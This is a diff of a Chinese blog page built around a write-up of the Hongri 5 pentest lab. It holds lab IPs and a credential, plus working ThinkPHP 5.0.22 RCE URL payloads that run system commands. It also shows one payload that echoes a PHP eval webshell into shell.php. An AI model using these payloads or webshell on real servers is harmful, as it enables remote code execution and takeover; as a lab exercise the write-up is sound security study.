@@ -19,7 +19,7 @@ win7  外网 IP： 192.168.135.150
 记得把 win7 防火墙关掉，不然其他机器没法去 ping 通 win7">
 <meta name="author" content="map[name:xvsf]">
 <link rel="canonical" href="https://xvshifu.github.io/xvsf/posts/hongri5/">
-<link crossorigin="anonymous" href="/xvsf/assets/css/stylesheet.107842b3d7a50993f400a2f9d591dd6f46830b1393c74b51d61e8545ebbb93dc.css" integrity="sha256-EHhCs9elCZP0AKL51ZHdb0aDCxOTx0tR1h6FReu7k9w=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/xvsf/assets/css/stylesheet.070c3d495fee0ddd7e9422e47ae72235cec36eed466deee6c2ab5060371fa638.css" integrity="sha256-Bww9SV/uDd1&#43;lCLkeuciNc7Dbu1Gbe7mwqtQYDcfpjg=" rel="preload stylesheet" as="style">
 <link rel="icon" href="https://xvshifu.github.io/xvsf/img/2.jpg">
 <link rel="icon" type="image/png" sizes="16x16" href="https://xvshifu.github.io/xvsf/favicon-16x16.png">
 <link rel="icon" type="image/png" sizes="32x32" href="https://xvshifu.github.io/xvsf/favicon-32x32.png">
@@ -90,7 +90,9 @@ win7  外网 IP： 192.168.135.150
 
 <div id="lightbox-overlay" class="lightbox-overlay" aria-hidden="true">
     <button class="lightbox-close" aria-label="关闭">&times;</button>
+    <button class="lightbox-nav lightbox-prev" aria-label="上一张">‹</button>
     <img class="lightbox-img" alt="">
+    <button class="lightbox-nav lightbox-next" aria-label="下一张">›</button>
 </div>
 
 
@@ -137,8 +139,7 @@ sun\Administrator dc123.com
     <meta property="article:published_time" content="2026-04-08T00:00:00+00:00">
     <meta property="article:modified_time" content="2026-04-08T00:00:00+00:00">
     <meta property="article:tag" content="红日靶场">
-    <meta property="article:tag" content="内网渗透">
-      <meta property="og:image" content="https://xvshifu.github.io/xvsf/img/1.png">
+    <meta property="article:tag" content="内网渗透"><meta property="og:image" content="https://xvshifu.github.io/xvsf/img/1.png">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://xvshifu.github.io/xvsf/img/1.png">
 <meta name="twitter:title" content="红日5靶场">
@@ -423,99 +424,94 @@ win7  外网 IP： 192.168.135.150
 <script>
     let activeElement;
     let elements;
-    
-    document.addEventListener('DOMContentLoaded', function (event) {
+    let tocLinks;
+    const visibleHeadings = new Set();
+
+    document.addEventListener('DOMContentLoaded', function () {
         checkTocPosition();
-    
-        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+
+        elements = Array.from(document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]'));
+        tocLinks = new Map(Array.from(document.querySelectorAll('.toc .inner a[href^="#"]')).map(link => [link.getAttribute('href').toLowerCase(), link]));
+
         if (elements.length > 0) {
-            
-            activeElement = elements[0];
-            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
-            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+            setActiveHeading(elements[0]);
+            observeHeadings();
         }
-    
-        
+
         const topLink = document.getElementById('top-link');
         if (topLink) {
             topLink.addEventListener('click', (event) => {
-                
                 event.preventDefault();
-    
-                
                 window.scrollTo({ top: 0, behavior: 'smooth' });
             });
         }
     }, false);
-    
-    window.addEventListener('resize', function(event) {
+
+    window.addEventListener('resize', function () {
         checkTocPosition();
     }, false);
-    
-    window.addEventListener('scroll', () => {
-        
-        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
-    
-        
-        if (scrollPosition === 0) {
-            return;
-        }
-    
-        
-        if (elements && elements.length > 0) {
-            
-            activeElement = Array.from(elements).find((element) => {
-                if ((getOffsetTop(element) - scrollPosition) > 0 && 
-                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
-                    return element;
-                }
-            }) || activeElement;
-    
-            elements.forEach(element => {
-                const id = encodeURI(element.getAttribute('id')).toLowerCase();
-                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
-                if (element === activeElement){
-                    tocLink.classList.add('active');
-    
-                    
-                    const tocContainer = document.querySelector('.toc .inner');
-                    const linkOffsetTop = tocLink.offsetTop;
-                    const containerHeight = tocContainer.clientHeight;
-                    const linkHeight = tocLink.clientHeight;
-    
-                    
-                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
-                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
-                } else {
-                    tocLink.classList.remove('active');
-                }
-            });
-        }
-    }, false);
-    
+
     const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
     const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
     const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
-    
+
+    function observeHeadings() {
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    visibleHeadings.add(entry.target);
+                } else {
+                    visibleHeadings.delete(entry.target);
+                }
+            });
+
+            const visible = elements.find(element => visibleHeadings.has(element));
+            if (visible) {
+                setActiveHeading(visible);
+                return;
+            }
+
+            const passed = elements.filter(element => element.getBoundingClientRect().top <= getHeaderOffset());
+            setActiveHeading(passed[passed.length - 1] || elements[0]);
+        }, {
+            rootMargin: `-${getHeaderOffset()}px 0px -55% 0px`,
+            threshold: [0, 1]
+        });
+
+        elements.forEach(element => observer.observe(element));
+    }
+
+    function setActiveHeading(element) {
+        if (!element || element === activeElement) return;
+        activeElement = element;
+
+        tocLinks.forEach(link => link.classList.remove('active'));
+        const id = `#${encodeURI(element.getAttribute('id')).toLowerCase()}`;
+        const tocLink = tocLinks.get(id);
+        if (!tocLink) return;
+
+        tocLink.classList.add('active');
+
+        const tocContainer = document.querySelector('.toc .inner');
+        if (tocContainer) {
+            const scrollPosition = tocLink.offsetTop - (tocContainer.clientHeight / 2) + (tocLink.clientHeight / 2);
+            tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
+        }
+    }
+
     function checkTocPosition() {
         const width = document.body.scrollWidth;
-    
+
         if (width - main - (toc * 2) - (gap * 4) > 0) {
             document.getElementById("toc-container").classList.add("wide");
         } else {
             document.getElementById("toc-container").classList.remove("wide");
         }
     }
-    
-    function getOffsetTop(element) {
-        if (!element.getClientRects().length) {
-            return 0;
-        }
-        let rect = element.getBoundingClientRect();
-        let win = element.ownerDocument.defaultView;
-        return rect.top + win.pageYOffset;   
+
+    function getHeaderOffset() {
+        return parseInt(getComputedStyle(document.body).getPropertyValue('--header-height'), 10) + 16;
     }
-    
 </script>
 <h1 id="环境搭建">环境搭建<a hidden class="anchor" aria-hidden="true" href="#环境搭建">#</a></h1>
 <h2 id="虚拟机密码">虚拟机密码<a hidden class="anchor" aria-hidden="true" href="#虚拟机密码">#</a></h2>
@@ -528,14 +524,14 @@ win7  外网 IP： 192.168.135.150
 <p>2008 内网 IP：192.168.138.138</p>
 <p>记得把 win7 防火墙关掉，不然其他机器没法去 ping 通 win7</p>
 <p><img alt="2008" decoding="async" height="600" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458491.png" style="max-width: 100%; height: auto; aspect-ratio: 800 / 600;" width="800"></p>
-<p><img decoding="async" height="1360" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459871.png" style="max-width: 100%; height: auto; aspect-ratio: 2180 / 1360;" width="2180"></p>
+<p><img decoding="async" height="1360" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459871.png" style="max-width: 100%; height: auto; aspect-ratio: 2180 / 1360;" width="2180"></p>
 <h2 id="win7-开启-web-服务">win7 开启 web 服务：<a hidden class="anchor" aria-hidden="true" href="#win7-开启-web-服务">#</a></h2>
-<p><img decoding="async" height="1360" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459400.png" style="max-width: 100%; height: auto; aspect-ratio: 2180 / 1360;" width="2180"></p>
+<p><img decoding="async" height="1360" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459400.png" style="max-width: 100%; height: auto; aspect-ratio: 2180 / 1360;" width="2180"></p>
 <p>访问 192.168.135.150 ：</p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456984.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456984.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <h1 id="信息搜集"><!-- raw HTML omitted -->信息搜集<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#信息搜集">#</a></h1>
 <h2 id="扫描端口">扫描端口：<a hidden class="anchor" aria-hidden="true" href="#扫描端口">#</a></h2>
-<div class="code-block-container" id="code-1779933344398070000" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344398070000">
+<div class="code-block-container" id="code-1779947699565701600" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699565701600">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -547,12 +543,12 @@ win7  外网 IP： 192.168.135.150
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344398070000" title="Toggle" aria-expanded="false" aria-controls="code-1779933344398070000" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699565701600" title="Toggle" aria-expanded="false" aria-controls="code-1779947699565701600" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344398070000-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699565701600-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
 </span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
@@ -604,26 +600,26 @@ win7  外网 IP： 192.168.135.150
 </span></span><span class="line"><span class="cl">└─$ </span></span></code></pre></td></tr></table>
 </div>
 </div></div>
-</div><p><img decoding="async" height="724" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458292.png" style="max-width: 100%; height: auto; aspect-ratio: 1083 / 724;" width="1083"></p>
+</div><p><img decoding="async" height="724" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458292.png" style="max-width: 100%; height: auto; aspect-ratio: 1083 / 724;" width="1083"></p>
 <h2 id="thinkphp-v5">ThinkPHP V5<a hidden class="anchor" aria-hidden="true" href="#thinkphp-v5">#</a></h2>
 <p>80 端口是 ThinkPHP V5.0 版本，搜索看看有哪些漏洞：</p>
-<p><a href="https://y4er.com/posts/thinkphp5-rce/">https://y4er.com/posts/thinkphp5-rce/</a></p>
-<p><img decoding="async" height="1391" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500807.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1391;" width="2560"></p>
+<p><a href="https://y4er.com/posts/thinkphp5-rce/" target="_blank" rel="noopener noreferrer">https://y4er.com/posts/thinkphp5-rce/</a></p>
+<p><img decoding="async" height="1391" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500807.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1391;" width="2560"></p>
 <p>存在漏洞：</p>
-<p><img decoding="async" height="305" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500981.png" style="max-width: 100%; height: auto; aspect-ratio: 1829 / 305;" width="1829"></p>
+<p><img decoding="async" height="305" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500981.png" style="max-width: 100%; height: auto; aspect-ratio: 1829 / 305;" width="1829"></p>
 <p>确定 thinkphp 具体版本：</p>
 <blockquote>
 <p><!-- raw HTML omitted -->为了确定具体版本，这里先使用报错查看，发现这里的版本为5.0.22，如果没记错的话这里是有一个tp远程命令执行漏洞的<!-- raw HTML omitted --></p>
 <p><!-- raw HTML omitted -->漏洞描述：由于thinkphp对框架中的核心Requests类的method方法提供了表单请求伪造，该功能利用<!-- raw HTML omitted --><code>&lt;font style=&quot;color:rgb(35, 57, 77);background-color:rgb(238, 238, 238);&quot;&gt;$_POST['_method']&lt;/font&gt;</code><!-- raw HTML omitted -->来传递真实的请求方法。但由于框架没有对参数进行验证，导致攻击者可以设置<!-- raw HTML omitted --><code>&lt;font style=&quot;color:rgb(35, 57, 77);background-color:rgb(238, 238, 238);&quot;&gt;$_POST['_method']='__construct'&lt;/font&gt;</code><!-- raw HTML omitted -->而让该类的变量被覆盖。攻击者利用该方式将filter变量覆盖为system等函数名，当内部进行参数过滤时便会进行执行任意命令。<!-- raw HTML omitted --></p>
 </blockquote>
-<p><img decoding="async" height="325" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457296.png" style="max-width: 100%; height: auto; aspect-ratio: 1102 / 325;" width="1102"></p>
-<p>版本为：<a href="http://www.thinkphp.cn/"><!-- raw HTML omitted -->ThinkPHP<!-- raw HTML omitted --></a><!-- raw HTML omitted --> V5.0.22 <!-- raw HTML omitted --></p>
+<p><img decoding="async" height="325" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457296.png" style="max-width: 100%; height: auto; aspect-ratio: 1102 / 325;" width="1102"></p>
+<p>版本为：<a href="http://www.thinkphp.cn/" target="_blank" rel="noopener noreferrer"><!-- raw HTML omitted -->ThinkPHP<!-- raw HTML omitted --></a><!-- raw HTML omitted --> V5.0.22 <!-- raw HTML omitted --></p>
 <p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <p>kali 中搜索：有一个 5.X 的 RCE</p>
-<p><img decoding="async" height="364" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458855.png" style="max-width: 100%; height: auto; aspect-ratio: 1891 / 364;" width="1891"></p>
+<p><img decoding="async" height="364" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458855.png" style="max-width: 100%; height: auto; aspect-ratio: 1891 / 364;" width="1891"></p>
 <p>并且也有相关的 POC</p>
-<p><img decoding="async" height="1245" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500494.png" style="max-width: 100%; height: auto; aspect-ratio: 2534 / 1245;" width="2534"></p>
-<div class="code-block-container" id="code-1779933344400114200" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344400114200">
+<p><img decoding="async" height="1245" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500494.png" style="max-width: 100%; height: auto; aspect-ratio: 2534 / 1245;" width="2534"></p>
+<div class="code-block-container" id="code-1779947699569674800" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699569674800">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -635,12 +631,12 @@ win7  外网 IP： 192.168.135.150
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344400114200" title="Toggle" aria-expanded="false" aria-controls="code-1779933344400114200" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699569674800" title="Toggle" aria-expanded="false" aria-controls="code-1779947699569674800" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344400114200-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699569674800-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
 </span><span class="lnt" id="2"><span class="lnlinks">2</span>
@@ -661,8 +657,8 @@ win7  外网 IP： 192.168.135.150
 </div>
 </div></div>
 </div><p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
-<p><img decoding="async" height="1464" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459664.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1464;" width="2560"></p>
-<div class="code-block-container" id="code-1779933344401138700" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344401138700">
+<p><img decoding="async" height="1464" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459664.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1464;" width="2560"></p>
+<div class="code-block-container" id="code-1779947699570668300" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699570668300">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -674,12 +670,12 @@ win7  外网 IP： 192.168.135.150
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344401138700" title="Toggle" aria-expanded="false" aria-controls="code-1779933344401138700" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699570668300" title="Toggle" aria-expanded="false" aria-controls="code-1779947699570668300" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344401138700-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699570668300-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
 </span></code></pre></td>
@@ -687,9 +683,9 @@ win7  外网 IP： 192.168.135.150
 <pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">?s<span class="o">=</span>index/<span class="se">\t</span>hink<span class="se">\a</span>pp/invokefunction<span class="p">&amp;</span><span class="k">function</span><span class="o">=</span>call_user_func_array<span class="p">&amp;</span>vars<span class="o">[</span>0<span class="o">]=</span>system<span class="p">&amp;</span>vars<span class="o">[</span>1<span class="o">][]=</span>whoami</span></span></code></pre></td></tr></table>
 </div>
 </div></div>
-</div><p><img decoding="async" height="235" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457607.png" style="max-width: 100%; height: auto; aspect-ratio: 1768 / 235;" width="1768"></p>
+</div><p><img decoding="async" height="235" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457607.png" style="max-width: 100%; height: auto; aspect-ratio: 1768 / 235;" width="1768"></p>
 <p><!-- raw HTML omitted -->看一下进程，发现无杀软那么不用免杀直接写webshell<!-- raw HTML omitted --></p>
-<div class="code-block-container" id="code-1779933344401138700" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344401138700">
+<div class="code-block-container" id="code-1779947699571671000" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699571671000">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -701,12 +697,12 @@ win7  外网 IP： 192.168.135.150
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344401138700" title="Toggle" aria-expanded="false" aria-controls="code-1779933344401138700" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699571671000" title="Toggle" aria-expanded="false" aria-controls="code-1779947699571671000" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344401138700-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699571671000-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
 </span></code></pre></td>
@@ -714,9 +710,9 @@ win7  外网 IP： 192.168.135.150
 <pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">?s<span class="o">=</span>index/<span class="se">\t</span>hink<span class="se">\a</span>pp/invokefunction<span class="p">&amp;</span><span class="k">function</span><span class="o">=</span>call_user_func_array<span class="p">&amp;</span>vars<span class="o">[</span>0<span class="o">]=</span>system<span class="p">&amp;</span>vars<span class="o">[</span>1<span class="o">][]=</span>tasklist /svc</span></span></code></pre></td></tr></table>
 </div>
 </div></div>
-</div><p><img decoding="async" height="409" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457669.png" style="max-width: 100%; height: auto; aspect-ratio: 2547 / 409;" width="2547"></p>
+</div><p><img decoding="async" height="409" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457669.png" style="max-width: 100%; height: auto; aspect-ratio: 2547 / 409;" width="2547"></p>
 <p><!-- raw HTML omitted -->echo写一句话木马进去，因为之前查看过没有杀软，这里就不需要做免杀处理<!-- raw HTML omitted --></p>
-<div class="code-block-container" id="code-1779933344401651000" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344401651000">
+<div class="code-block-container" id="code-1779947699572684800" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699572684800">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -728,12 +724,12 @@ win7  外网 IP： 192.168.135.150
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344401651000" title="Toggle" aria-expanded="false" aria-controls="code-1779933344401651000" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699572684800" title="Toggle" aria-expanded="false" aria-controls="code-1779947699572684800" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344401651000-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699572684800-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
 </span></code></pre></td>
@@ -741,9 +737,9 @@ win7  外网 IP： 192.168.135.150
 <pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">?s<span class="o">=</span>index/<span class="se">\t</span>hink<span class="se">\a</span>pp/invokefunction<span class="p">&amp;</span><span class="k">function</span><span class="o">=</span>call_user_func_array<span class="p">&amp;</span>vars<span class="o">[</span>0<span class="o">]=</span>system<span class="p">&amp;</span>vars<span class="o">[</span>1<span class="o">][]=</span><span class="nb">echo</span> <span class="s2">&#34;&lt;?php @eval(</span><span class="nv">$_POST</span><span class="s2">[cmd]);?&gt;&#34;</span> &gt; shell.php</span></span></code></pre></td></tr></table>
 </div>
 </div></div>
-</div><p><img decoding="async" height="487" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458931.png" style="max-width: 100%; height: auto; aspect-ratio: 2193 / 487;" width="2193"></p>
+</div><p><img decoding="async" height="487" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458931.png" style="max-width: 100%; height: auto; aspect-ratio: 2193 / 487;" width="2193"></p>
 <p>成功写入：</p>
-<div class="code-block-container" id="code-1779933344402162600" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344402162600">
+<div class="code-block-container" id="code-1779947699574670700" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699574670700">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -755,12 +751,12 @@ win7  外网 IP： 192.168.135.150
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344402162600" title="Toggle" aria-expanded="false" aria-controls="code-1779933344402162600" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699574670700" title="Toggle" aria-expanded="false" aria-controls="code-1779947699574670700" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344402162600-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699574670700-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
 </span></code></pre></td>
@@ -768,16 +764,16 @@ win7  外网 IP： 192.168.135.150
 <pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">?s<span class="o">=</span>index/<span class="se">\t</span>hink<span class="se">\a</span>pp/invokefunction<span class="p">&amp;</span><span class="k">function</span><span class="o">=</span>call_user_func_array<span class="p">&amp;</span>vars<span class="o">[</span>0<span class="o">]=</span>system<span class="p">&amp;</span>vars<span class="o">[</span>1<span class="o">][]=</span>dir</span></span></code></pre></td></tr></table>
 </div>
 </div></div>
-</div><p><img decoding="async" height="370" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456719.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 370;" width="2560"></p>
+</div><p><img decoding="async" height="370" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456719.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 370;" width="2560"></p>
 <p>蚁剑连接：</p>
-<p><img decoding="async" height="993" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456445.png" style="max-width: 100%; height: auto; aspect-ratio: 1538 / 993;" width="1538"></p>
+<p><img decoding="async" height="993" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456445.png" style="max-width: 100%; height: auto; aspect-ratio: 1538 / 993;" width="1538"></p>
 <h4 id="thinkphp批量检测"><!-- raw HTML omitted -->thinkphp批量检测<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#thinkphp批量检测">#</a></h4>
